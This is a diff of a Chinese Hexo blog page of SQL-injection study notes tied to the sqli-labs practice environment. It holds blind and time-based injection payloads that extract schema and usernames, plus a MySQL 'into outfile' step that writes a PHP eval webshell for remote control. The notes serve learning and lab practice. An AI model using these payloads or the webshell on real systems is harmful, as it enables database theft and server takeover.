@@ -193,7 +193,7 @@
   const ipt = document.querySelector('#search-input')
   const btn = document.querySelector('#search-btn')
   const layer = document.querySelector('#search-layer')
-  const posts = JSON.parse(`[{"title":"How to build up a blog site using Hexo and Guithub Pages","path":"2024/08/21/How-to-build-up-a-blog-site-using-Hexo-and-Guithub-Pages/"},{"title":"VScode","path":"2025/09/19/VScode/"},{"title":"sql","path":"2025/10/10/sql/"},{"title":"php","path":"2025/10/05/php/"},{"title":"web任务","path":"2025/10/04/web任务/"},{"title":"虚拟机搭建","path":"2024/09/15/虚拟机搭建/"}]`)
+  const posts = JSON.parse(`[{"title":"How to build up a blog site using Hexo and Guithub Pages","path":"2024/08/21/How-to-build-up-a-blog-site-using-Hexo-and-Guithub-Pages/"},{"title":"ISCTF 复现","path":"2026/01/16/ISCTF-复现/"},{"title":"VScode","path":"2025/09/19/VScode/"},{"title":"php","path":"2025/10/05/php/"},{"title":"sql","path":"2025/10/10/sql/"},{"title":"web任务","path":"2025/10/04/web任务/"},{"title":"极客大挑战2025 web复现","path":"2026/01/16/极客大挑战2025-web复现/"},{"title":"虚拟机搭建","path":"2024/09/15/虚拟机搭建/"}]`)
   ipt.addEventListener('keyup', e => {
     if (e.key === 'Enter') {
       handleSearch()
@@ -270,7 +270,7 @@
         </a>
         <a href="/archives">
           <div>
-            <span>4 </span>
+            <span>5 </span>
             <span>归档</span>
           </div>
         </a>
@@ -327,7 +327,7 @@
       </h5>
       <p class="main-left--subtitle">
         <span>文章数目：</span>
-        <span>6 篇</span>
+        <span>8 篇</span>
       </p>
       <p class="main-left--subtitle">
         <span>最近动态：</span>
@@ -335,7 +335,7 @@
       </p>
       <p class="main-left--subtitle">
         <span>上线时间：</span>
-        <span>7030天</span>
+        <span>7103天</span>
       </p>
       <p class="main-left--subtitle">
         <span>当前版本：</span>
@@ -397,25 +397,25 @@
 
 <h1 id="floor-报错注入"><a href="#floor-报错注入" class="headerlink" title="floor()报错注入"></a>floor()报错注入</h1><p>涉及到的函数：<br>   rand()：随即返回0～1间的小数,select rand() from users:users这张表有几行返回几个随机数<br>   floor():小数向下取整<br>   ceiling():小数向上取整<br>   concat_ws():将括号内数据用第一个字断连接起来，<br>   group by:分组<br>   count():汇总统计数量<br>   limit:显示指定行数</p>
 <h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><p>页面没有回显和报错，有真假值转换</p>
-<h1 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and ascii(substr(select database(),1,1)&gt;=100 --+</span></span><br></pre></td></tr></table></figure>
-<p>判断数据库的第一个字符的ascii码是否大于等于100，之后根据页面回显的真假值判数据库名称的每个字母。<br>之后可替换select database()为所要查询的表、列等语句，后面加limit 0,1</p>
+<h1 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and ascii(substr(select database()),1,1)&gt;=100 --+</span></span><br></pre></td></tr></table></figure>
+<p>判断数据库的第一个字符的ascii码是否大于等于100，之后根据页面回显的真假值判数据库名称的每个字母。<br>之后可替换select database()为所要查询的表、列等语句，后面加limit 0,1<br>limit(参数1,参数2)<br>参数1:返回第几行数据<br>参数2:返回几条数据</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;=100 --+</span></span><br></pre></td></tr></table></figure>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and ascii(substr((select column_name from information_schema.columns where table_schema=database() limit 0,1),1,1))&gt;=100 --+</span></span><br></pre></td></tr></table></figure>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and ascii(substr((select username from users limit 0,1),1,1))&gt;=100 --+</span></span><br></pre></td></tr></table></figure>
 
 <h1 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h1><p>数据库会执行命令代码，但只返回一个正常页面</p>
-<p>sleep():参数为休眠时长<br>if(判断条件，真，假):如果条件为真返回真，为假返回假<br>if(1&#x3D;2,sleep(0),sleep(3))</p>
+<p>sleep():参数为休眠时长<br>ascii码：<br>  0-9:48-57<br>  a-z:97-122<br>  A-Z:65-90<br>if(判断条件，真，假):如果条件为真返回真，为假返回假<br>if(1&#x3D;2,sleep(0),sleep(3))</p>
 <p>首先通过执行时间判断闭合方式</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and sleep(2)</span></span><br></pre></td></tr></table></figure>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">？id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and if(ascii(substr((select database()),1,1)&gt;=100),sleep(0),sleep(3)) --+</span></span><br></pre></td></tr></table></figure>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">？id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)&gt;=100),sleep(0),sleep(3)) --+</span></span><br></pre></td></tr></table></figure>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">？id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and if(ascii(substr((elect column_name from information_schema.columns where table_schema=database() limit 0,1),1,1)&gt;=100),sleep(0),sleep(3)) --+</span></span><br></pre></td></tr></table></figure>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">？id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and if(ascii(substr((select username from users limit 0,1),1,1)&gt;=100),sleep(0),sleep(3)) --+</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">？id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and if(ascii(substr((select database()),1,1))&gt;=100,sleep(0),sleep(3)) --+</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">？id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;=100,sleep(0),sleep(3)) --+</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">？id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and if(ascii(substr((select column_name from information_schema.columns where table_schema=database() limit 0,1),1,1))&gt;=100,sleep(0),sleep(3)) --+</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">？id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and if(ascii(substr((select username from users limit 0,1),1,1))&gt;=100,sleep(0),sleep(3)) --+</span></span><br></pre></td></tr></table></figure>
 
 <h1 id="Mysql文件上传"><a href="#Mysql文件上传" class="headerlink" title="Mysql文件上传"></a>Mysql文件上传</h1><p>show variables like ‘%secure%’ :用来查看mysql是否有文件读写权限<br>数据库的file权限规定了数据库用户是否有权限，向操作系统写入和读取已存在的权限<br>into outfile 命令使用的环境：必须知道一个，服务器上可以写入文件的文件夹的完整路径<br><?php @eval ($_POST['password']);?>为一句木马<br>1.测试闭合方式<br>输入?id&#x3D;1’ –+ 和?id&#x3D;1’) –+都报错，不是单引号和单引号加括号闭合<br>输入?id&#x3D;1” –+ 和?id&#x3D;1’)) –+不报错，但输入?id&#x3D;1” and 1&#x3D;2 –+时不报错，说明双引号可能被两个单引号包裹，不是双引号闭合<br>而?id&#x3D;1’)) and 1&#x3D;2 –+报错，说明是’))闭合<br>2.查列数</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;)) group by 3 --+</span></span><br></pre></td></tr></table></figure>
 <p>3.测试查询语句</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;)) union by 1,2,3 --+</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;)) union select 1,2,3 --+</span></span><br></pre></td></tr></table></figure>
 <p>4.文件上交指令</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;)) union select 1,&quot;&lt;?php @enal($_POST[&#x27;</span>password<span class="string">&#x27;]);?&gt;&quot;,3 into outfile “C://.....”</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
 <p>可以在电脑里注入木马之后用蚁剑操控</p>
@@ -431,6 +431,8 @@
 <p>  2.自动注入</p>
 <h1 id="Post-提交注入"><a href="#Post-提交注入" class="headerlink" title="Post 提交注入"></a>Post 提交注入</h1><p>GET提交和POST提交的区别</p>
 <p>1.get提交可以被缓存，post提交不会<br>2.get提交参数会保留在历史记录，post提交不会<br>3.get提交可以收集为书签，post提交不会<br>4.get提交有长度限制2048个字符，而post提交无限制，可以使用二进制数据<br>post提交更安全</p>
+<p>sqli-labs<br>Get型<br>Less-1:union注入 字符型 闭合方式为’<br>Less-2:union注入 数字型</p>
+<p>Post型<br>Less-11:union注入 闭合方式为 ‘<br>Less-12:union注入 闭合方式为 “)<br>Less-13:报错注入 闭合方式为 ‘)<br>Less-14:布尔盲注 闭合方式为 “<br>Less-15:布尔盲注 闭合方式为 ‘<br>Less-16:布尔盲注 闭合方式为 “)<br>Less-17:模拟登陆后修改页面注入而非登录页面，在用户名输入已有的用户名，要在新密码处找注入点。不能进行布尔盲注，修改密码返回值只有正确没有错误，查看源码发现是update注入 闭合方式为‘<br>Less-18:</p>
 
     </article>
     
@@ -456,6 +458,11 @@
       </div>
       
         <div class="catelogue catelogue-2">
+          
+            <p>
+              <span>上一篇：</span>
+              <a href="/2026/01/16/ISCTF-复现/">ISCTF 复现</a>
+            </p>
            
           
             <p>
